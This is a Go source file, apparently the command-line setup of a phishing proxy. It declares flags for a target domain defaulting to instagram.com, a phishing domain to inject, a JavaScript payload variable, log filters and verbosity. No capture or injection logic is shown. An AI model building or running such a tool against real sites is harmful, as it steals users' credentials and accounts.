package main

import (
	"flag"
	"fmt"
	"strings"
)

type VerbosityLevel int

const (
	VerbosityNone VerbosityLevel = iota
	VerbosityHeaders
	VerbosityAll
)

var (
	targetDomain   string
	phishingDomain string
	jsPayload      string
	logFilters     []string
	verbosity      VerbosityLevel
)

func init() {
	// Domain flags
	flag.StringVar(&targetDomain, "target", "instagram.com", "Original target domain")
	flag.StringVar(&phishingDomain, "phishing", "localhost", "Phishing domain to inject")
	flag.Func("filter", "Comma-separated regex patterns", func(s string) error {
		if s != "" {
			logFilters = strings.Split(s, ",")
		}
		return nil
	})

	// Verbosity flags
	flag.Var(&verbosityFlag{}, "verbose", "Log level [headers|all]")
	flag.Var(&verbosityFlag{}, "v", "Shorthand for verbose")
}

// Custom flag type for verbosity
type verbosityFlag struct{}

func (v *verbosityFlag) Set(s string) error {
	switch s {
	case "headers":
		verbosity = VerbosityHeaders
	case "all":
		verbosity = VerbosityAll
	default:
		return fmt.Errorf("invalid verbosity level: %s", s)
	}
	return nil
}

func (v *verbosityFlag) String() string {
	return ""
}
